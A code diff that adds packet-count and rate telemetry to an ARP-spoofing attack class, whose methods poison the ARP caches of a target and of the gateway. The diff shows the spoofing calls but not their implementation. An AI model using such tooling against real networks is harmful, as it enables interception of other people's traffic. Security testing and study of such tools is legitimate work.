@@ -144,6 +144,23 @@ class ArpAttack:
 
         self._stop_event = threading.Event()
         self._thread: Optional[threading.Thread] = None
+        # Live telemetry — incremented every time _spoof() actually sends a
+        # packet so the GUI can render real rate/throughput, not just
+        # elapsed seconds.
+        self.packets_sent: int = 0
+        self.started_at: float = 0.0
+
+    @property
+    def uptime_seconds(self) -> float:
+        if not self.started_at:
+            return 0.0
+        return time.time() - self.started_at
+
+    @property
+    def packet_rate(self) -> float:
+        """Packets/sec averaged over the entire attack uptime."""
+        up = self.uptime_seconds
+        return (self.packets_sent / up) if up > 0 else 0.0
 
     # ---------------------------------------------------------------- #
 
@@ -216,6 +233,8 @@ class ArpAttack:
         print(f"[*] Starting ARP-spoof method {self.method} …")
 
         self._stop_event.clear()
+        self.started_at = time.time()
+        self.packets_sent = 0
         self._thread = threading.Thread(target=self._run, daemon=True)
         self._thread.start()
 
@@ -257,18 +276,21 @@ class ArpAttack:
                 self.gateway_ip, self.target_ip,
                 iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
             )
+            self.packets_sent += 2 * cfg.burst
         elif self.method == "B":
             # Tell client: gateway's MAC is mine
             _spoof(
                 self.target_ip, self.gateway_ip,
                 iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
             )
+            self.packets_sent += cfg.burst
         elif self.method == "C":
             # Tell gateway: client's MAC is mine
             _spoof(
                 self.gateway_ip, self.target_ip,
                 iface=self.iface, burst=cfg.burst, inter_delay=cfg.inter_burst_delay,
             )
+            self.packets_sent += cfg.burst
 
     def _restore_arp(self) -> None:
         if not (self.target_mac and self.gateway_mac):
